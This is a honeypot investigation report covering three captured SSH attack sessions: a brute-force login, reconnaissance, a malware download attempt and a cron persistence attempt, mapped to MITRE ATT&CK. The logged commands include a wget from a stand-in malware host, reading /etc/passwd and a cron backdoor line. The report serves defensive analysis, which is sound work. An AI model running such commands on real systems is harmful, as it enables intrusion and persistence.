# Investigation Report — Cowrie Honeypot Attack Sessions
**Date:** 2026-07-02  
**Analyst:** Abhinav Vijayvergia  
**Severity:** High  

## Summary
Three attack sessions were captured by the Cowrie SSH honeypot 
deployed on Kali Linux (192.168.1.72). Two manual sessions originated 
from a Windows machine (192.168.1.83) and one automated brute force 
session originated from Kali itself (192.168.1.72). Attacker performed 
full reconnaissance, attempted malware download, and established 
persistence via cron job.

## Attack Timeline (UTC)

| Time | Source IP | Event |
|------|-----------|-------|
| 05:45:05 | 192.168.1.83 | Session 1 connected (session: cdb9eb1a776f) |
| 05:45:20 | 192.168.1.83 | Login success (root:admin) |
| 05:46:12 | 192.168.1.83 | CMD: whoami |
| 05:46:20 | 192.168.1.83 | CMD: ls |
| 05:46:31 | 192.168.1.83 | CMD: cat /etc/passwd |
| 05:46:41 | 192.168.1.83 | CMD: cd /tmp |
| 05:46:59 | 192.168.1.83 | CMD: wget http://malware.example.com/virus.sh |
| 05:49:59 | 192.168.1.83 | Session 1 closed (duration: 294s) |
| 06:02:53 | 192.168.1.72 | Hydra brute force started |
| 06:02:55 | 192.168.1.72 | Login success (root:password) |
| 06:02:55 | 192.168.1.72 | Hydra session closed (duration: 1s) |
| 12:30:46 | 192.168.1.83 | Session 2 connected |
| 12:30:48 | 192.168.1.83 | Login success (root:admin) |
| 12:30:58 | 192.168.1.83 | CMD: uname -a |
| 12:31:10 | 192.168.1.83 | CMD: ifconfig |
| 12:31:25 | 192.168.1.83 | CMD: ps aux |
| 12:31:38 | 192.168.1.83 | CMD: crontab -1 (typo) |
| 12:31:47 | 192.168.1.83 | CMD: crontab -l |
| 12:32:42 | 192.168.1.83 | CMD: echo backdoor cron job |
| 12:35:38 | 192.168.1.83 | Session 2 closed |

## Indicators of Compromise (IOCs)

### Source IPs
| IP | Type | Sessions | Events |
|----|------|----------|--------|
| 192.168.1.83 | Manual attacker (Windows) | 2 | 25 |
| 192.168.1.72 | Automated tool (Hydra) | 1 | 9 |

### Credentials Captured
| Username | Password | Source | Count |
|----------|----------|--------|-------|
| root | admin | 192.168.1.83 | 2 |
| root | password | 192.168.1.72 | 1 |

### HASSH Fingerprints
| HASSH | Client | Type |
|-------|--------|------|
| 701158e75b508e76f0410d5d22ef9df0 | SSH-2.0-OpenSSH_for_Windows_9.5 | Human attacker |
| 015322ee8471fa8338c558a918183b11 | SSH-2.0-libssh_0.11.3 | Hydra automated tool |

### Malware URL Attempted
    http://malware.example.com/virus.sh

### Persistence Mechanism Attempted
    */5 * * * * /tmp/backdoor.sh
Cron job writing backdoor execution every 5 minutes to /tmp/cron.txt

## MITRE ATT&CK Mapping

| Command | Tactic | Technique ID | Technique Name |
|---------|--------|-------------|----------------|
| whoami | Discovery | T1033 | System Owner/User Discovery |
| uname -a | Discovery | T1082 | System Information Discovery |
| ifconfig | Discovery | T1016 | System Network Configuration Discovery |
| ps aux | Discovery | T1057 | Process Discovery |
| ls | Discovery | T1083 | File and Directory Discovery |
| cat /etc/passwd | Discovery | T1087 | Account Discovery |
| wget malware URL | Command & Control | T1105 | Ingress Tool Transfer |
| echo backdoor cron | Persistence | T1053 | Scheduled Task/Job |

## Attacker Profile
- **Type:** Human attacker + automated tool
- **OS:** Windows (identified via SSH client string)
- **Skill level:** Intermediate — followed standard post-exploitation checklist
- **Intent:** Reconnaissance + persistence establishment
- **Tool used:** OpenSSH for Windows (manual), Hydra via libssh (automated)
- **Distinguishing behavior:** Made typo (`crontab -1`) confirming human operator

## Key Findings
- Cowrie successfully deceived attacker into believing access was real
- All credentials captured including plaintext passwords
- HASSH fingerprinting successfully distinguished human vs automated attacker
- Attacker followed textbook post-exploitation sequence
- Persistence attempt via cron job captured in full
- Malware download URL logged despite failed DNS resolution

## Recommendations
- Block 192.168.1.83 and 192.168.1.72 at firewall level
- Add captured passwords to blocklist / monitor for reuse
- Monitor /tmp directory for backdoor.sh creation attempts
- Deploy Splunk alert for any wget/curl commands in honeypot sessions
- HASSH 015322ee8471fa8338c558a918183b11 = Hydra signature — block at IDS level
